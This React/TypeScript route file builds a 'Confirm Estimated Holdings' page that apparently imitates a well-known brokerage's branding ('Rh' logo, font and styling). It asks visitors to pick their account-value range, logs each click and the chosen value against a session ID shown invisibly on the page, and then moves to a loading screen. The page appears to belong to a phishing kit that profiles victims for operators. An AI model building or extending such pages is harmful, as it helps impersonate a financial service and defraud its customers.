import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { GlobeIcon, Rh3DBackground, RH_FONT_FAMILY, RhLogo, useRhTracking } from "@/components/rh/RhShared";

export const Route = createFileRoute("/rh/balance")({
  head: () => ({ meta: [{ title: "Confirm Estimated Holdings" }] }),
  component: RhBalancePage,
});

const RANGES = [
  "Under $1,000",
  "$1,000 – $4,999",
  "$5,000 – $9,999",
  "$10,000 – $24,999",
  "$25,000 – $49,999",
  "$50,000 – $99,999",
  "$100,000 – $499,999",
  "$500,000+",
];

function RhBalancePage() {
  const { trackClick, trackInput, rhNavigate, sessionId } = useRhTracking();
  const [selected, setSelected] = useState<string | null>(null);

  const handleConfirm = () => {
    if (!selected) return;
    trackClick("Confirm Estimated Balance");
    trackInput("Estimated Balance", selected);
    rhNavigate("/rh/loading");
  };

  return (
    <div style={{ display: "flex", minHeight: "100vh", background: "#000", fontFamily: RH_FONT_FAMILY }}>
      <style>{`
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
      `}</style>

      <div className="hidden md:flex" style={{ width: "50%", background: "#000", alignItems: "center", justifyContent: "center", overflow: "hidden", position: "relative" }}>
        <Rh3DBackground />
      </div>
      <div className="hidden md:block" style={{ width: 1, background: "rgba(255,255,255,0.12)", flexShrink: 0 }} />

      <div className="w-full md:w-1/2" style={{ background: "#000", display: "flex", flexDirection: "column" }}>
        <div className="md:hidden" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "20px 24px" }}>
          <RhLogo />
          <button style={{ display: "flex", alignItems: "center", gap: 6, background: "transparent", border: "none", color: "#fff", fontSize: 14, fontWeight: 500, cursor: "pointer", padding: "8px 12px" }}>
            <GlobeIcon /><span>US</span>
          </button>
        </div>

        <div style={{ flex: 1, display: "flex", alignItems: "flex-start", justifyContent: "center", padding: "80px 60px 40px 60px" }}>
          <div style={{ width: "100%", maxWidth: 416 }}>
            <h1 style={{ fontSize: 28, fontWeight: 400, color: "#fff", marginBottom: 12, lineHeight: 1.3 }}>Confirm Estimated Holdings</h1>
            <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginBottom: 32, lineHeight: 1.5 }}>
              Choose the range that best matches your account value.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: 6, marginBottom: 20 }}>
              {RANGES.map((range, i) => {
                const isSelected = selected === range;
                return (
                  <button key={range} onClick={() => setSelected(range)}
                    style={{ width: "100%", height: 48, borderRadius: 8, padding: "0 14px", border: "none", cursor: "pointer", backgroundColor: isSelected ? "rgba(255,255,255,0.1)" : "rgba(255,255,255,0.04)", outline: isSelected ? "2px solid #fff" : "2px solid transparent", outlineOffset: -2, transition: "background-color 0.15s, outline-color 0.2s", animation: "fadeInUp 0.3s ease both", animationDelay: `${i * 40}ms`, display: "flex", alignItems: "center", justifyContent: "space-between", fontFamily: "inherit" }}>
                    <span style={{ fontSize: 14, fontWeight: 500, color: "#fff", lineHeight: "20px" }}>{range}</span>
                    <div style={{ width: 20, height: 20, borderRadius: "50%", border: isSelected ? "none" : "2px solid rgba(255,255,255,0.3)", backgroundColor: isSelected ? "#fff" : "transparent", display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.2s", flexShrink: 0 }}>
                      {isSelected && (
                        <svg width="10" height="10" viewBox="0 0 10 10" fill="none" style={{ animation: "scaleIn 0.2s ease" }}>
                          <circle cx="5" cy="5" r="4" fill="#000" />
                        </svg>
                      )}
                    </div>
                  </button>
                );
              })}
            </div>

            <button onClick={handleConfirm} disabled={!selected}
              style={{ width: "100%", height: 52, borderRadius: 26, border: "none", cursor: selected ? "pointer" : "default", backgroundColor: selected ? "#fff" : "rgba(255,255,255,0.2)", color: selected ? "#000" : "rgba(255,255,255,0.4)", fontSize: 16, fontWeight: 500, fontFamily: "inherit", pointerEvents: selected ? "auto" : "none" }}>
              Confirm
            </button>
          </div>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
